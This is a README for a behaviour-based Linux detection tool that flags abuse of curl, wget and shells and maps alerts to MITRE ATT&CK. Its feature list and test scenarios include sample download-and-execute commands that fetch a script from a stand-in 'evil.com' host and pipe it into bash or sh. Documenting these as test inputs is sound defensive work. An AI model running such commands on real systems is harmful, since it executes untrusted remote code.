# 🛡️ LOLBins Detection Tool (Linux)

A **behavior-based detection tool** that identifies malicious abuse of **Living-Off-The-Land Binaries (LOLBins)** such as `curl`, `wget`, `bash`, and `sh` on Linux systems.

This project focuses on **real attacker behavior**, not signatures, combining:
- Process monitoring
- Shell history analysis
- Temporal process correlation
- MITRE ATT&CK mapping
- False-positive reduction

---

## 🧠 What are LOLBins?

**Living-Off-The-Land Binaries (LOLBins)** are legitimate system tools that attackers abuse to:
- Download payloads
- Execute remote code
- Evade detection

Examples:
```bash
curl | bash
wget -O- | sh
```

## 🚀 Features
✅ Process Monitoring

- Monitors running processes using psutil

- Logs executions of common LOLBins

✅ Shell History Analysis

- Reads new .bash_history entries only

- Detects dangerous patterns like:

```bash
curl http://evil.com/payload.sh | bash
```

✅ Temporal Process Correlation

- Detects suspicious chains like:

```bash
curl → bash (within 2 seconds)
```

- Requires execution intent (pipe, -O-, payload indicators)

✅ False-Positive Reduction

- Trusted domains are suppressed

- Benign interactive shells do not trigger alerts

✅ MITRE ATT&CK Mapping

Alerts are mapped to:

- T1105 – Ingress Tool Transfer

- T1059 – Command and Scripting Interpreter

- T1059.004 – Unix Shell

✅ Explainable Alerts

Each alert includes:

- Exact command

- Downloader → shell relationship

- MITRE techniques

## ⚙️ Requirements

- Python 3.8+

- Linux OS

- Dependency:

```bash
pip install -r requirements.txt
```

## Test Scenario

Benign Command
```bash
curl https://example.com
```
✔ Logged as INFO
❌ No alert

Malicious Execution
```bash
curl http://evil.com/payload.sh | bash
```

🚨 Alert:
```bash
[HIGH] process-chain | downloader followed by shell | bash | MITRE=T1105,T1059
```

Advance Abuse:
```bash
wget http://evil.com/payload.sh -O- | sh
```
🚨 HIGH severity alert

📄 Log Files
process.log

Raw process telemetry:
```bash
PID | binary | command
```
info.log

Benign LOLBin usage:

```bash
[INFO] curl | {...}
```

alerts.log

Confirmed malicious behavior:
```bash
[HIGH] process-chain | curl ... -> bash | MITRE=T1105,T1059
```

## 🧠 Detection Logic Summary

| Behavior              | Alert |
|-----------------------|-------|
| curl only             | ❌    |
| interactive bash      | ❌    |
| trusted domains       | ❌    |
| `curl \| bash`        | ✅    |
| `wget -O- \| sh`      | ✅    |

## 🧩 MITRE ATT&CK Techniques

| Technique | Description                       |
|-----------|-----------------------------------|
| T1105     | Ingress Tool Transfer             |
| T1059     | Command and Scripting Interpreter |
| T1059.004 | Unix Shell                        |

